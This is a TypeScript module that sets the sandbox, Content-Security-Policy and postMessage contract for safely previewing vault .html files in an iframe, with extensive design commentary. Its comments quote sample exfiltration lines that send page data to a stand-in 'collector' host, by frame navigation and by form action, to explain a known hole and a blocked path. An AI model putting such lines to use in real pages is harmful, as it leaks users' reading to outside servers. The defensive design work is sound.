/**
 * The SEAL a served `.html` is drawn behind — what makes showing somebody
 * else's markup safe to do at all, now that the markup is allowed to RUN.
 *
 * A `.md` is text this app renders: it goes through a parser, a sanitiser and a
 * rewrite (`@olai/web`'s `client/markdown/`), and what reaches the DOM is what
 * those three allowed. A `.html` is the opposite shape — it is already the
 * thing a browser runs, and there is no rendering step to be strict in. So the
 * question is not "what do we allow through", it is "what is this markup
 * allowed to do once it is on screen", and that has to be answered before the
 * first byte of it is drawn.
 *
 * THE RULE THAT CHANGED (2026-08-16, the human's ruling). A preview whose own
 * JavaScript is dead is not a preview. The previous seal admitted exactly one
 * script by its hash — ours, the tape measure below — and refused the file's,
 * on purpose, and said so in a sentence marked not negotiable. That sentence is
 * overruled: a saved dashboard, an exported report, a page whose whole content
 * is drawn by its own script are the ordinary contents of somebody's vault, and
 * a preview that shows them blank is showing the wrong thing. PAGE JAVASCRIPT
 * RUNS. What that costs, and what it does not, is the whole subject of this
 * file.
 *
 * WHAT DID NOT MOVE AN INCH is the mechanism that decides the CONSEQUENCE of
 * running: the frame's origin is NOBODY'S. `sandbox` is present and
 * `allow-same-origin` is absent, which is what makes the origin opaque —
 * `document.cookie` is empty, `localStorage` THROWS, `window.parent` is
 * cross-origin and every read of this app's DOM is a `SecurityError`. That was
 * true when nothing could run and it is exactly as true now that everything
 * can, which is the point: the old policy stacked a second bar in front of a
 * door that was already locked, and taking the second bar off did not unlock
 * the door. It is spelled twice, because it is now the only thing standing
 * there — on the element (`@olai/web`'s `client/document/Hypertext.tsx`) and in
 * the POLICY HEADER below, which carries its own `sandbox allow-scripts` so a
 * served page is opaque-origin even when it is not in a frame at all.
 *
 * `allow-scripts` WITH `allow-same-origin` is the combination that must never
 * be written: a document with both can reach into its own frame element and
 * take the sandbox off. One of the two, and it is this one, is a frame that can
 * compute; the pair is a frame that can escape.
 *
 * SO WHAT IS THE SEAL FOR NOW, if not for stopping code. It is for stopping
 * BYTES — where they may come from and where they may go — and that is the one
 * promise this app makes about a page it shows: *a saved page cannot tell
 * anybody else's server what you are reading*. That needs no script to break: a
 * page full of remote images tells a stranger's server what this reader has
 * open the moment it is drawn. So {@link sealPolicy} is a NETWORK policy, and
 * it is read that way top to bottom — every fetching directive names ONE
 * source, the media route on the host the reader asked for, and everything that
 * merely COMPUTES is allowed without argument. `'unsafe-inline'` and
 * `'unsafe-eval'` are in there for exactly that reason: they decide what may
 * run, and what may run is settled by the paragraph above.
 *
 * A HEADER rather than a `<meta>`, and that is what serving the file by URL
 * bought. Two of the directives below cannot be written in markup at all —
 * `sandbox` is ignored in a `<meta>` policy by every browser, and it is the one
 * that makes a top-level visit to `/media/notes/report.html` land in an opaque
 * origin instead of in this app's own. That address is reachable now (it is how
 * the frame gets its bytes), so somebody can type it, and without this header a
 * saved page opened that way would be running in olai's origin with olai's
 * storage under it. The header is not a nicety; it is the reason the route is
 * allowed to exist.
 *
 * WHAT IS STILL PREPENDED, and it is much less than it was: a doctype, a colour
 * scheme, the tape measure and the link handler ({@link SEAL}). No policy — that
 * is a header now. No `<base>` — the document has a real URL to resolve against,
 * which is the whole of point 3 below.
 *
 * RELATIVE ADDRESSES RESOLVE THEMSELVES. This is what a real URL is worth. A
 * `srcdoc` document has no address, so `art/shot.png` in it resolved against
 * nothing at all, and the previous seal had to prepend a `<base href>` at the
 * media route to make a picture draw — which made every relative LINK in the
 * file 404 (`html-preview-relative-links` on the roadmap). Served at
 * `/media/notes/report.html`, the file's own URL is its base: `art/shot.png` is
 * `/media/notes/art/shot.png` and `other.html` is `/media/notes/other.html`,
 * both of them files of this vault. The vault's own shape is the URL space, so
 * nothing has to be rewritten to agree with it.
 *
 * AND THE TWO PART COMPANY AT THE CLICK, which is the rest of that bug and what
 * {@link OPEN} is for. The picture is FETCHED — it is a part the page draws
 * itself with, so it travels this route and the policy above is the whole of
 * what governs it. The link is not: `other.html` is a file olai has a PAGE for,
 * and a reader following it wants that page — its address, its heading, its
 * entry lit in the directory column — rather than the neighbour drawn inside a
 * frame that is still, by every other sign in the app, `report.html`. So the
 * handler below claims that one click, hands the address out, and the app
 * navigates. Nothing about the seal moves an inch to make that work: the frame
 * gets no origin, no channel back and no privilege it did not have. It gets to
 * SAY something, over the same `postMessage` it already says its height on, and
 * to be believed exactly as far as a lookup in this app's own list of files.
 *
 * `base-uri 'none'` is what keeps that true. A saved page carries a `<base
 * href>` of its own often enough that it is the ordinary case rather than the
 * attack ("save page as" writes them), and pointed at the site it came from it
 * would move every relative address in the file to a stranger's server. The
 * previous seal won that race by being FIRST in tree order; this one wins it by
 * refusing the element outright, which also covers the `<base>` a script sets
 * after the fact. The file is not edited to make this true — the directive
 * refuses the element, the bytes still carry it.
 *
 * WHAT A PAGE MAY FETCH, then, is one path on one host: `<host>/media/`, the
 * route that answers a picture, a page, a stylesheet, a script or a font under
 * the served directory and a 404 for everything else (`./media.ts` is the
 * guard, `@olai/format`'s `isAsset` is the allowlist, `@olai/server`'s
 * `media.ts` is the route). TWO GUARDS, independent: the policy decides what
 * may be asked for, the route decides what may be answered, and neither is
 * trusted to be the other. The one weakness a path-restricted source has — a
 * redirect drops the path and leaves the origin — is answered by what is at the
 * end of this one: a read of one file under the served directory for a page,
 * and a static file engine with no index and no fallback for everything else.
 * Neither has anywhere to redirect anybody to; both answer a file or a 404.
 *
 * AND `form-action 'none'`, which is here because `default-src` does NOT cover
 * it. Most directives fall back; `form-action` never has — so a
 * `<form action="https://collector/">` in a saved page would be covered only by
 * the SANDBOX (no `allow-forms`, so a submit is blocked), which is a fact about
 * the element rather than about the markup. It is refused twice now, and the
 * policy is self-sufficient. (opencode's review of PR #197 asked for exactly
 * this, and it survives the new rule unchanged.)
 *
 * THE HOLE THIS RULE OPENS, named as plainly as the old costs were, because it
 * is real and it is not closeable here. A script can navigate its own frame:
 * `location.href = "https://collector/?" + whatever it knows`. No CSP directive
 * stops that — `navigate-to` was specified and then removed from the standard,
 * `form-action` covers forms only, and the sandbox's absent
 * `allow-top-navigation` protects the TAB rather than the frame. So a page that
 * WANTS to tell somebody else's server what it is can, once, by leaving. What
 * the seal still buys against that: every passive fetch — image, font,
 * stylesheet, script, `fetch`, frame, form post — stays inside this vault, so a
 * page that merely CARRIES a stranger's addresses (the overwhelming ordinary
 * case, and the one the promise was written about) reaches nobody; and the
 * frame comes home, since `Hypertext.tsx` puts the file back the moment the
 * frame lands on a document that is not one of ours. It is one shot, not a
 * channel. The residue is written into the report of the PR that made this
 * change rather than left for a reader to discover.
 *
 * AND WHY THE FRAME CANNOT SIMPLY BE ASKED WHERE IT IS, which is the second
 * thing the ruling cost. `Hypertext.tsx` tells a document olai served from one
 * it did not by whether the tape measure below reports from it — and a page
 * that has walked off to a server of its own choosing can post that same
 * message. That is not a hole to be plugged: once the previewed file runs
 * script, it is the adversary, and every secret we could give it to prove
 * itself is a secret it can hand to a confederate. The counting over there is
 * therefore a bound on how far a page can drag the frame, not a proof of where
 * the frame is, and it is written as one.
 *
 * WHERE THIS FILE LIVES is the last decision and the one a reader should not
 * have to guess at. The seal used to be the client's, because the client built
 * the markup. It is a WIRE CONTRACT now: the tape measure is prepended by
 * `@olai/server`, its message is read by `@olai/web`, and those two packages
 * cannot import each other — which is the exact sentence this package's own
 * docstring opens with, and why `mediaHref`/`mediaTarget` are next door.
 *
 * That argument covers the MESSAGE half exactly. The policy half ({@link
 * sealPolicy}, {@link spellsHost}) has one consumer, the server, and by the
 * rule above it could live there — it is here anyway, and deliberately: the
 * sandbox argument is ONE argument spanning the header, the frame's attribute
 * and the prefix, and splitting it would leave half a security narrative in
 * each package with nothing saying they are one. It also keeps the fail-closed
 * policy assertable with no browser and no server standing up
 * (`./seal.test.ts`).
 *
 * Pure, and its own module, so the rule can be READ and asserted without a
 * browser: `./seal.test.ts` is what says the policy has not been widened by
 * somebody who needed one embed to work.
 */

import { FILE_EXTS } from "@olai/format"

import { mediaPath, MEDIA_PREFIX } from "./media.ts"
import { ours } from "./press.ts"

/**
 * WHAT THE FRAME SAYS, and the whole of it: one of these two prefixes, then a
 * number.
 *
 * The two ends of a `postMessage` have to agree on a shape, and the producer
 * here is text inside a script that no compiler reads. So the agreement is
 * THESE CONSTANTS, and both ends are in this module — {@link MEASURE} builds
 * the message out of them and {@link heard} takes it apart. Spelling one
 * twice, once in the script and once in whatever parsed the result, is a rule
 * kept by memory across two files, and its failure mode is the worst kind:
 * nothing throws, no test goes red, the message simply stops being recognised
 * and the preview sits on its fallback height forever.
 *
 * A prefixed STRING rather than an object with named fields, because that is
 * the smallest thing that carries one number across a trust boundary. An object
 * would put its key names in the same two places the tag would have been —
 * spelled in the script's text, spelled again in the parser — and buy nothing:
 * the receiver has to validate every byte either way.
 *
 * TWO of them, since pictures draw. A height read while the page is still
 * arriving is a height with holes in it: an `<img>` that has not loaded is a
 * zero-tall box, so the page under it is short by however much the pictures
 * turn out to be. `load` is the moment there are no holes left, and the
 * receiver has to be able to tell that reading from the ones before it —
 * `Hypertext.tsx` accepts one of EACH per width, which is what keeps a page
 * sized in `vh` from climbing its own ladder (the argument is over there, where
 * the counting is). Two prefixes rather than a field, for the reason there is a
 * prefix at all: it is the smallest difference that survives the trip.
 *
 * A TABLE rather than two loose constants, because the two are one thing — the
 * kinds of reading there are — and the receiver does not want a boolean it has
 * to re-decide at every use. {@link Reading} is the key, {@link heard}
 * carries it on a `reading` arm, and `Hypertext.tsx` files its accepted widths UNDER it: one name,
 * carried from the script that posts it to the record that remembers it, with
 * nothing projecting it into a flag and back on the way.
 */
const READING = {
  arriving: "olai:page-height:",
  settled: "olai:page-loaded:",
} as const

/** Which of the two a message is: taken while the page may still be arriving,
 *  or after its `load`, when there is nothing left to wait for. */
export type Reading = keyof typeof READING

/**
 * THE HELLO: the first thing every document this server seals says, and the
 * only thing it says that is not a number.
 *
 * It answers a question the embedder cannot ask any other way. A frame's
 * document may change without anybody in this app asking — a page refreshes
 * itself, a reader follows a link — and one of those destinations is a file of
 * this vault, answered by this same route with this same seal over it, while
 * the other is somebody else's server. `Hypertext.tsx` has to tell them apart
 * to know whether to put the file back, and an opaque origin answers no
 * questions about where it is.
 *
 * POSTED AT PARSE TIME, before `DOMContentLoaded` and long before `load`, which
 * is the whole of why it is a message of its own rather than the height
 * reading. The embedder learns about a navigation when the frame's `load` event
 * fires; a hello sent from the first script in the document is queued well
 * before that, so by the time the question is asked the answer is already in.
 * A height cannot do that job — it waits for a layout, and a page with a
 * picture in it waits for the picture.
 *
 * It proves LESS than it looks like it proves, and `Hypertext.tsx` says so at
 * length: a page that has walked off to a server of its own can post these
 * eleven bytes too. It is what a document olai served always says, not
 * something only such a document can say.
 */
const HELLO = "olai:page-sealed"

/** The other end of {@link HELLO} is {@link heard}, with the other two: what a
 *  sealed frame may say is ONE vocabulary, and it is classified once. */

/**
 * THE THIRD THING A SEALED PAGE MAY SAY: a reader clicked a link, and the
 * address it names is a file of this vault that olai has a page for.
 *
 * It is a MESSAGE rather than a navigation because of what the click means. A
 * saved page linking to `other.html` beside it is naming a file of the vault,
 * and this app has a page for that file — its own address, its own heading, its
 * entry lit in the directory column. Following it inside the frame renders the
 * neighbour and leaves every one of those saying the file the reader has just
 * left, which is a preview pretending to be a browser. So the frame hands the
 * address OUT and the app navigates: the reader lands exactly where clicking
 * that file in the sidebar lands, because it is the same route.
 *
 * `postMessage` is the only way out of an opaque origin and the channel this
 * seal already speaks (the greeting and the heights above it), so it is the
 * channel — kolu's own iframe renderer documents the same shape for the same
 * reason. What travels is the PATHNAME the browser resolved, percent-escapes
 * and all, exactly as it would have fetched it.
 *
 * NOTHING IN IT IS TRUSTED, and the receiving end is written on that
 * assumption: a page that runs script can post any string at all, so what
 * arrives is a LOOKUP KEY and never an instruction. {@link heard} decodes it
 * through the vault's one URL decoder and hands back a path; `Hypertext.tsx`
 * then matches that path against the set of files this app is actually serving
 * and navigates using ITS OWN copy of the string. A path the vault does not
 * hold moves nothing — no address, no page, no screen that says the frame
 * named it — which is the difference between a lookup and an instruction.
 */
const OPEN = "olai:open-page:"

/**
 * The tape measure: the first of the two programs olai puts into somebody
 * else's page ({@link FOLLOW} is the other, and they are as separate as they
 * look — one measures, one listens for a click, and neither knows about the
 * other).
 *
 * It says {@link HELLO} and then reports the page's own height, and does
 * nothing else — no DOM of its own, no state, no reply channel. An iframe does not size to its
 * content, so without it a preview is a fixed slice of the screen: a three-line
 * receipt above two thirds of a screen of white, and a long article inside a
 * scrollbar inside a scrollbar. The only thing that can measure a page is
 * something inside the page, and the only way out of an opaque origin is
 * `postMessage`.
 *
 * It is no longer the ONLY thing running in there, and that changes exactly one
 * thing about it: it is no longer pinned by hash. There is nothing left for a
 * hash to protect — the policy admits `'unsafe-inline'`, because the file's own
 * scripts are now supposed to run — so the constant is a program we prepend
 * rather than a program we can prove is the only one. The receiver was already
 * written for that world: what arrives over `postMessage` is treated as a CLAIM
 * and clamped by CSS at the other end, so the worst a lying height can do is
 * pick one of the two ends of a range the reader would have got anyway.
 *
 * `documentElement.offsetHeight` rather than its `scrollHeight`, and that is
 * the whole trick: in standards mode (which the doctype in {@link SEAL}
 * guarantees) the root box is auto-height, so its `offsetHeight` is the
 * CONTENT's height — while `scrollHeight` is `max(content, viewport)` and would
 * therefore report the frame's current height back to the frame, pinning a
 * short page at whatever it was first given. `body.scrollHeight` is the max'd-in
 * second reading for the page that sets `html { height: 100% }` and overflows
 * it — GUARDED, and the guard is the new rule's doing. It used to rest on
 * "every path into `post` runs at `DOMContentLoaded` or later, and by then
 * there is a body", which was true when nothing in the page could run: a page
 * whose own script does `document.body.remove()` — or replaces the document
 * with `document.write` — has no body afterwards, and an exception thrown in
 * here would land on the console of somebody else's page as ours.
 *
 * TWO mechanisms do the measuring, and they answer different questions. A
 * `ResizeObserver` on the root box is the first: it delivers a callback the
 * moment it starts observing, which is the first measurement, and again
 * whenever that box changes — which is how a page reflowing into a narrower
 * window gets a frame that follows it, and also how a page that DRAWS ITSELF
 * with its own script gets a frame the size of what it drew.
 *
 * `load` is the second, and it is what pictures made necessary: an `<img>` is a
 * box with no height until its bytes arrive, so the page's real height is not
 * knowable until the pictures are in. That reading is TAGGED differently
 * ({@link READING}'s `settled`), because the receiver cannot tell "the page grew
 * because its pictures landed" from "the page grew because I made the frame
 * taller and it is measured in `vh`", and it may only act on the first of those.
 *
 * Guarded rather than assumed, because an exception thrown in here would land
 * on the console of somebody else's page, which is a confusing place to leave
 * one of ours.
 */
const MEASURE = `(function () {
  parent.postMessage(${JSON.stringify(HELLO)}, "*")
  var post = function (tag) {
    var page = document.documentElement
    var body = document.body
    parent.postMessage(
      tag + Math.max(page.offsetHeight, body ? body.scrollHeight : 0),
      "*"
    )
  }
  var measure = function () {
    post(${JSON.stringify(READING.arriving)})
  }
  addEventListener("DOMContentLoaded", function () {
    if (typeof ResizeObserver === "function") {
      new ResizeObserver(measure).observe(document.documentElement)
    } else {
      measure()
    }
    addEventListener("load", function () {
      post(${JSON.stringify(READING.settled)})
    })
  })
})()`

/**
 * The second program olai puts into somebody else's page: the one that notices
 * a reader clicking a link at a page of this vault, and hands the address out
 * instead of following it.
 *
 * WHICH CLICKS IT CLAIMS — five conditions, each with what holds it named at
 * the end of its own bullet, because they are not all held by the same kind of
 * test and a reader auditing this should not have to guess which:
 *
 *   - a PLAIN left click, and nothing modified — which is not a rule this file
 *     states. It is `./press.ts`'s `ours`, the app's one answer to what a reader
 *     meant by a press, INTERPOLATED here as its own source: the frame has no
 *     module system, so a function cannot be imported into it, but it can be
 *     shipped. One definition, read by the client and carried into the page,
 *     rather than the second hand-typed spelling this was — whose drift had no
 *     symptom in the direction that matters (a press this app has decided is
 *     not its own, still claimed in the frame). WHAT HOLDS IT: `./seal.test.ts`
 *     runs the shipped text against the function over every combination of the
 *     six facts a press has — which pins what the RULE answers, and cannot pin
 *     that this handler is what asks it. A modified click is read in a real
 *     browser by `html_previews.feature` on the app's side only, since which
 *     modifier opens a tab is the platform's decision and not olai's;
 *   - a click the PAGE has not already answered. Bubble phase and
 *     `defaultPrevented`, so a saved page that routes its own links keeps them.
 *     Capturing would take clicks off a page that had already decided what they
 *     mean, to send them somewhere the page never asked for. WHAT HOLDS IT: the
 *     scenario where a page prevents its own link's default and neither the app
 *     nor the frame moves — which is the one assertion that tells the two
 *     phases apart, since a capturing handler would see the press first, find
 *     nothing prevented, and navigate the app out from under the page;
 *   - THIS VAULT's address space and no other: the document's own scheme and
 *     host, under the media route. A link to a stranger is not ours to answer —
 *     it walks the frame off and comes home, which is the behaviour that was
 *     already there and is deliberately untouched. WHAT HOLDS IT: the two
 *     walk-off scenarios;
 *   - a file olai has a PAGE for, by suffix ({@link FILE_EXTS} — every kind the
 *     registry claims: a `.html`, a `.md`, and an outline beside them). WHICH
 *     page is not asked here and could not be: a `.md` and a `.html` are read at
 *     `/doc/` and an outline is a tree at `/o/`, and the app routes the path to
 *     whichever list holds it. Everything else under the route is a part a page
 *     draws ITSELF with — a picture, a stylesheet, a font — and a link to one is
 *     a link to a file, which the frame goes on following exactly as it did.
 *     WHAT HOLDS IT: the suffix list is asserted against the registry, and a
 *     link at a `.png` is followed by the frame in a scenario of its own;
 *   - NO IN-PAGE ANCHOR. `#top` is a jump inside the document the reader is
 *     already looking at, and there is nothing for the app to do with one: the
 *     frame keeps it, because a page scrolling itself is not a navigation.
 *     `other.html#beds` IS one — it names another file and a place inside it —
 *     and it is claimed, fragment and all, because the `/doc/` page can land on
 *     a section now (`@olai/web`'s `routes.ts` carries it, and the two faces do
 *     the landing by two different mechanisms). Same document is the whole
 *     test, which is why it is a comparison against `location.pathname` rather
 *     than a look at whether there is a hash at all. WHAT HOLDS IT: one
 *     scenario clicks a fragment link AT THE FILE NEXT DOOR and reads both
 *     halves — the app arriving at the neighbour's address WITH the anchor on
 *     it, and the page landing on the section — and another clicks an in-page
 *     `#top` and reads the app staying exactly where it was.
 *
 * A `.md` is on that list on purpose, and it is the one judgement call here. The
 * media route REFUSES a `.md` — it is not an `isAsset`, so the frame following
 * such a link gets a 404 today, which is a dead click at the end of a link
 * somebody wrote in their own vault. The click never reaches the network now: it
 * names a note, and a note has a page. What makes the two consistent rather than
 * contradictory is that they answer different questions — what a browser may be
 * SERVED, and what a reader may be TAKEN to.
 *
 * `new URL` rather than string arithmetic, because resolving `../other.html`
 * against the document's own address is the browser's job and it is already
 * done: an anchor's `href` property IS the resolved absolute URL. The `try` is
 * for the one element that has an `href` which is not a string — an `<a>` in
 * SVG, whose `href` is an `SVGAnimatedString` — and it falls out as a link this
 * does not claim.
 */
const FOLLOW = `(function () {
  var pages = ${JSON.stringify(FILE_EXTS)}
  var ours = ${ours.toString()}
  addEventListener("click", function (event) {
    if (!ours(event)) return
    var node = event.target
    var link = node && node.closest ? node.closest("a") : null
    if (!link) return
    var at
    try {
      at = new URL(link.href)
    } catch (_) {
      return
    }
    if (at.protocol !== location.protocol || at.host !== location.host) return
    if (at.hash !== "" && at.pathname === location.pathname) return
    var path = at.pathname
    if (!path.startsWith(${JSON.stringify(MEDIA_PREFIX)})) return
    for (var i = 0; i < pages.length; i++) {
      if (!path.endsWith(pages[i])) continue
      event.preventDefault()
      parent.postMessage(${JSON.stringify(OPEN)} + path + at.hash, "*")
      return
    }
  })
})()`

/**
 * What is put in front of the file's own bytes, and the whole of it.
 *
 * A CONSTANT now, which is the shape of what the header took over: this prefix
 * used to be built per file and per origin because it carried a policy and a
 * base, and it carries neither. Nothing about it depends on which file is being
 * shown or where this app is served.
 *
 * A doctype FIRST, so the frame is in standards mode: the file's own doctype
 * arrives a few characters later and is ignored as a stray token, and a frame
 * that fell into quirks mode would draw somebody's page wrong for a reason they
 * could never find. (It is also what makes the measurement above mean anything
 * — the auto-height root box is a standards-mode fact.)
 *
 * Then a colour scheme, which is not security but is the same kind of decision:
 * a fact about the frame that the file did not ask for and cannot be sensibly
 * left to chance. The preview is LIGHT — an unstyled page is black on white in
 * every browser, and inheriting a dark app's scheme would leave that page's own
 * black text on the frame's own white ground, unreadable, with the file itself
 * blameless. A page that styles itself paints over this and is unaffected.
 *
 * Then the two programs olai puts in there — the tape measure and the link
 * handler — in front of every byte of the file, so both are installed before the
 * file's own markup has been parsed, and beside the file's own scripts now
 * rather than instead of them. ONE `<script>` element holding both, joined by
 * the `;` two adjacent parenthesised expressions need: they are two subjects and
 * one prefix, and a second element would be a second thing for a reader auditing
 * what this app injects to have to find.
 *
 * The MEASURE is first, and one line of it depends on that: the greeting is the
 * earliest thing a sealed document says, and a click handler installed ahead of
 * it would put a statement in front of the sentence every embedder is waiting
 * on.
 *
 * WHAT THIS COSTS, said out loud: the response is no longer the file byte for
 * byte, it is this prefix and then the file byte for byte. Nothing of the
 * file's is parsed, stripped, rewritten or re-encoded — the seal is a PREFIX,
 * which is what lets it be honest about markup it does not understand — but the
 * length changed, so the route serving it cannot answer a byte range and does
 * not offer to (`@olai/server`'s `media.ts`). The charset travels on the
 * response instead of being read out of the file's own `<meta>`, for the same
 * reason: this prefix would push a file's charset declaration past the 1024
 * bytes a parser looks in. Both are named where they are done.
 */
export const SEAL = `<!doctype html>` +
  `<meta name="color-scheme" content="light">` +
  `<script>${MEASURE};${FOLLOW}</script>`

/**
 * The one place a sealed page may fetch from, as a CSP source — or NOTHING,
 * for a host this refuses to spell.
 *
 * Fail-closed, and that is the whole reason this is a function with a test
 * rather than one interpolation. The host arrives from the request's own `Host`
 * header, which is the only thing that can be right: a policy names an origin,
 * and the origin the browser will compare it against is the one the browser
 * asked for. A header is also somebody else's string, and it lands unescaped
 * inside a policy where a `;` would open a directive of their choosing. So it
 * is matched against the shape of a host and nothing else — a name or a
 * bracketed IPv6 literal, an optional port, no path, no credentials, no query.
 *
 * A poisoned `Host` therefore cannot widen anything: it names some other host,
 * the browser resolves the page's own addresses against the host it actually
 * used, and every fetch is refused. Fail-closed by construction rather than by
 * trust.
 *
 * AN ALLOWLIST RATHER THAN A PARSE, and the difference matters enough to write
 * down because the tempting edit is `new URL(...)`. A URL parser is built to
 * accept what browsers accept, and the forbidden-host set it enforces does not
 * include `;` — so `http://a;b` parses, round-trips as its own origin, and
 * would carry a directive of somebody's choosing straight into the policy.
 */
const HOST = /^(?:[a-z0-9.-]+|\[[0-9a-f:.]+\])(?::\d{1,5})?$/i

/**
 * Whether this module will spell a host into a policy at all — the same
 * question {@link sealPolicy} asks, exported so the SERVER can say out loud
 * that it refused one.
 *
 * A refused host is not an error to fail on: the page is still served, and
 * still sealed, with nothing it may fetch. But it is a page that draws no
 * pictures and runs no scripts of its own for a reason nobody can see from the
 * outside, and "most errors should surface to the user at some level" is this
 * repository's own rule (HACKING.md). One rule, one owner, asked twice —
 * rather than the route re-deriving what a host looks like and drifting from
 * the policy it is reporting on.
 */
export const spellsHost = (host: string): boolean => HOST.test(host)

/**
 * BOTH SCHEMES, on the one host, and it is not a widening: it is the same route
 * named twice because this process cannot see which of the two the browser
 * used. olai listens on plain HTTP; a reader may still reach it through
 * something that terminated TLS, and then the document's own URL is `https:`
 * while every source we could have derived says `http:` — a preview that draws
 * nothing at all, for a reason nobody would find. Naming both is naming the
 * SAME host and the SAME path, never a second place: `https://<this host>` is
 * either this app or somebody who has already taken this app's name.
 */
const sourcesOn = (host: string): ReadonlyArray<string> =>
  spellsHost(host)
    ? [`http://${host}${MEDIA_PREFIX}`, `https://${host}${MEDIA_PREFIX}`]
    : []

/**
 * The policy a served `.html` is answered with, as the header's value.
 *
 * Read it as two halves, because it is two decisions and only one of them is
 * about the file:
 *
 *   1. `sandbox allow-scripts` — WHOSE ORIGIN this document is in: nobody's,
 *      whether it arrives in olai's frame or in a tab somebody typed the
 *      address into. It intersects with the frame element's own `sandbox`
 *      rather than fighting it (a browser takes the more restrictive of the
 *      two, and the two are the same), so the frame's guarantee does not depend
 *      on which of the two a reader remembers.
 *   2. everything else — WHERE BYTES MAY COME FROM: {@link sourcesOn}, and
 *      nothing else in the world. `default-src` carries it, so a directive
 *      nobody thought of (`connect-src`, `font-src`, `media-src`,
 *      `manifest-src`) falls back to the vault route rather than to open
 *      network. `script-src` and `style-src` re-state it because they add the
 *      keywords that let a page COMPUTE and PAINT — inline scripts, `eval`,
 *      inline styles — which is the ruling this file exists to carry out and
 *      costs nothing on the network side. `frame-src 'none'` is a narrowing of
 *      the same rule: a preview is one frame, and one frame is what
 *      `Hypertext.tsx` counts. `form-action` and `base-uri` are the two
 *      outgoing paths `default-src` does not cover, spelled above.
 *
 * A host this refuses to spell gets the same policy with the vault LEFT OUT of
 * every list — a page that fetches nothing rather than a page that fetches
 * anywhere, which is the failure this direction is supposed to have. Left out
 * rather than replaced by `'none'`, because `'none'` is only a source list when
 * it is the WHOLE of one: a browser ignores it beside any other source, so
 * `script-src 'none' 'unsafe-inline'` is a policy that reads as a refusal and
 * behaves as a permission. An empty list is spelled `'none'` and nothing else
 * is.
 */
export const sealPolicy = (host: string): string => {
  const vault = sourcesOn(host)
  const from = (...keywords: ReadonlyArray<string>): string =>
    [...vault, ...keywords].join(" ") || `'none'`
  return `sandbox allow-scripts; ` +
    `default-src ${from()}; ` +
    `script-src ${from("'unsafe-inline'", "'unsafe-eval'")}; ` +
    `style-src ${from("'unsafe-inline'")}; ` +
    `frame-src 'none'; form-action 'none'; base-uri 'none'`
}

/**
 * EVERYTHING A SEALED FRAME CAN SAY, as one value with three arms.
 *
 * It is one vocabulary on one channel, and it was three exported readers before
 * — a boolean for the greeting, an optional report for a height, an optional
 * path for a click — which the one receiver had to try in an order it was
 * trusted to remember. Three parsers is three chances to be asked in the wrong
 * order, and the rule that the prefixes do not overlap lived nowhere: no type
 * held it, no test asserted the group, and a fourth message would have made a
 * fourth reader and a fourth line at the call site.
 *
 * As arms they cannot be spelled wrong. One function decides once, the decision
 * is carried as a NAME, and the receiver switches on it — which is the same
 * move `@olai/web`'s `Hypertext.tsx` makes with `Custody` a few lines from
 * where it reads this, and for the same reason: a fact about what something IS
 * belongs in the value, not in the order somebody asks about it.
 */
export type Said =
  /** The frame is a document this server sealed — {@link HELLO}. It proves less
   *  than it looks like it proves, and the receiver says so at length. */
  | { readonly kind: "hello" }
  /** A page of this vault the reader clicked a link at — {@link OPEN}. Still
   *  not a file: a path SHAPED like one, to be looked up. `at` is the place
   *  inside it the link named, when it named one; it is not checked against
   *  anything here, because which ids a page has is not knowable until it has
   *  been drawn. */
  | { readonly kind: "open"; readonly file: string; readonly at?: string }
  /** How tall the page says it is, and which of the two readings it is —
   *  {@link READING}. A claim, clamped by CSS at the other end. */
  | { readonly kind: "reading"; readonly reading: Reading; readonly height: number }

/**
 * What a frame said, as one of {@link Said}'s arms — or nothing, which is the
 * answer to every message that was not one of ours and to every one of ours
 * that made no sense.
 *
 * It lives HERE, beside the scripts whose output it reads, because the two are
 * one thing: a message format. Split across a module boundary it would be a
 * format nobody owns, kept in step by whoever remembers to change both sides.
 * Here it is also PURE and browser-free like everything else in this file, so
 * `./seal.test.ts` can hand it the hostile inputs a real frame never sends.
 *
 * Everything is checked, because the sender is an opaque origin and nothing it
 * says is privileged. Arm by arm:
 *
 *   - the GREETING is an identity, and only the exact string is it;
 *   - an OPEN carries an address, and the judgement of what that address may
 *     name is not made here — it is `./media.ts`'s {@link mediaPath}, the ONE
 *     decoder of this URL space and already the guard the route stands behind,
 *     so anything outside `/media/`, a climb spelled either way, a segment
 *     smuggling a separator or a NUL, and a malformed escape all fall out
 *     there. A second parse written for this message would be a second
 *     traversal guard, and the one nobody thought to attack is the one that
 *     would be wrong. WHAT COMES BACK IS STILL NOT A FILE: `secrets.md` is a
 *     perfectly well-formed path and this hands it back. What makes that safe
 *     is the step after it, and it is the receiver's — the path is looked UP in
 *     the set of files the app is serving, and a lookup that misses moves
 *     nothing. This is where the message stops being a URL; it is not where it
 *     starts being trusted;
 *   - a READING carries a number. `Number` of a prefix-stripped tail rejects
 *     the empty string as `0` and anything wordy as `NaN`, both of which fall
 *     out through the same gate as a negative or an infinity. Rounded UP,
 *     because a fractional layout truncated down is the last line of a page
 *     clipped by half a pixel. WHICH reading it is, is decided here and then
 *     carried as a name: the two prefixes are separate strings and neither is
 *     the other's, so `settled` is never a claim the sender got to make by
 *     spelling a number oddly.
 *
 * The arms are tried in the order they are cheapest to refuse, and that order
 * is not load-bearing: `./seal.test.ts` asserts that no one of the three
 * prefixes begins another, which is what makes the classification a fact about
 * the message rather than about this function's arm order.
 */
/** A fragment as the page will look for it — the escaping undone, and nothing
 *  at all for an empty one or a malformed escape. Neither is a place in a page,
 *  and a frame that sends one has said nothing rather than said something
 *  wrong. */
const decoded = (fragment: string): string | undefined => {
  if (fragment === "") return undefined
  try {
    return decodeURIComponent(fragment)
  } catch {
    return undefined
  }
}

export const heard = (said: unknown): Said | undefined => {
  if (said === HELLO) return { kind: "hello" }
  if (typeof said !== "string") return undefined
  if (said.startsWith(OPEN)) {
    const address = said.slice(OPEN.length)
    const file = mediaPath(address)
    if (file === null) return undefined
    // The fragment is cut off the END, which is where an address keeps it —
    // `mediaPath` has already stopped reading at the same `#`, so the two
    // halves are taken from one string by one rule rather than parsed twice.
    const hash = address.indexOf("#")
    const at = hash === -1 ? undefined : decoded(address.slice(hash + 1))
    return at === undefined ? { kind: "open", file } : { kind: "open", file, at }
  }
  const reading: Reading | undefined = said.startsWith(READING.settled)
    ? "settled"
    : said.startsWith(READING.arriving)
    ? "arriving"
    : undefined
  if (reading === undefined) return undefined
  const height = Number(said.slice(READING[reading].length))
  return Number.isFinite(height) && height > 0
    ? { kind: "reading", reading, height: Math.ceil(height) }
    : undefined
}
